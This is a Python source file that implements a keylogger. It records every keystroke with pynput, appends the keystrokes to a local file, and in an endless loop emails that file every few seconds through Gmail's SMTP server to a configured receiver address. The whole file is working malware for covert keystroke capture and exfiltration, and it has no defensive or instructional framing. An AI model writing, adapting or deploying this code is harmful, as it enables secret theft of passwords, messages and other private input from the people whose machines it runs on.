from pynput import keyboard
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import pandas
keys = []


def keyPressed(key):
    global keys

    if key == keyboard.Key.enter:
        print("\n", end="")
        keys.append("\n")

    elif key == keyboard.Key.tab:
        print("\t", end="")
        keys.append("\t")

    elif key == keyboard.Key.space:
        print(" ", end="")
        keys.append("\n")

    elif key == keyboard.Key.backspace and len(keys) <= 0:
        print("  backspace  ")

    elif key == keyboard.Key.backspace and len(keys) > 0:
        print("  backspace  ")
        keys.pop()


    else:
        key = str(key).replace("'", "")
        print(key, end="")
        keys.append(key)
    if len(keys) > 10:
        writeKeys()



def writeKeys():
    global keys
    with open("keyfile.txt", "a") as keylog:
        for key in keys:
            keylog.write(str(key))
        keys = []

def sendEmail(sender,reciver,password):
    timeInterval = 10
    time.sleep(timeInterval)  # Sleep for 60 seconds (1 minute)


    msg = MIMEMultipart()

    msg['From'] = sender

    msg['To'] = reciver

    msg['Subject'] = "Subject of the Mail"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = "keyfile.txt"
    attachment = open("keyfile.txt", "rb")

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(sender, password)
    text = msg.as_string()
    s.sendmail(sender, reciver, text)

    s.quit()


if __name__ == "__main__":
    fromEmail = "SENDER EMAIL"
    toEmail = "RECIEVER EMAIL"
    fromEmailPass ="PASSWORD"

    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    while(True):
        sendEmail(fromEmail,toEmail,fromEmailPass)